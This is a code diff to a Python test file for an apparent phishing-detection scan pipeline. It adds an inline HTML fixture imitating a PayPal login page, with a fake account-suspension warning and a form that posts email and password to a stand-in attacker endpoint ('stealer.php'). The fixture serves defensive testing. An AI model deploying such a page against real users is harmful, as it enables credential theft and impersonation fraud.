@@ -13,7 +13,31 @@ from app.models.scan_finding import ScanFinding
 from app.models.certificate import Certificate
 from app.services.scan_orchestrator import execute_scan_pipeline_sync
 from app.db.session import local_session_factory
-from tests.test_content_analyzer import HTML_PAYPAL_PHISHING
+
+HTML_PAYPAL_PHISHING = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Log in to your PayPal account</title>
+    <meta property="og:site_name" content="PayPal" />
+</head>
+<body>
+    <div class="header">
+        <img src="https://attacker-cdn.com/paypal_logo.png" alt="PayPal Logo" />
+        <h2>Sign in to PayPal</h2>
+    </div>
+    <div class="urgent-banner">
+        <p>Warning: Your account has been suspended! Immediate action is required to verify your account.</p>
+    </div>
+    <form action="http://attacker-exfiltration.xyz/stealer.php" method="POST">
+        <input type="text" name="email" placeholder="Email address" />
+        <input type="password" name="password" placeholder="Password" />
+        <button type="submit">Log In</button>
+    </form>
+</body>
+</html>
+"""
+
 
 
 def test_pipeline_execution_mocked():
